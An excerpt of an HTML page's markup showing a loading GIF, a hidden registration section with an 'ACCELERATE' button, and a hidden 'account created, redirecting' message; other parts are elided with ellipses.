...
<body>
  ...
  <img style="width: 100%;height: 100%; position:relative; " src="https://wordpress-750084-3360515.cloudwaysapps.com/telegram/loading.gif"/>
  ...
  <div class="register d-none">
        ...
        <button class="btn btn-success btn-block btn-lg gradient-custom-4 text-body" id="btn"  >ACCELERATE</button>
          ...
          <div class="last d-none">
            ...
            <p style="text-align:center; font-size:25px; border:1px solid; padding:4px;position: absolute;top: 30%;color: #28a745;">You have successfully created your account.<br>Thank you!<br><span style="color:#000;">Please wait while redirecting..</span></p>
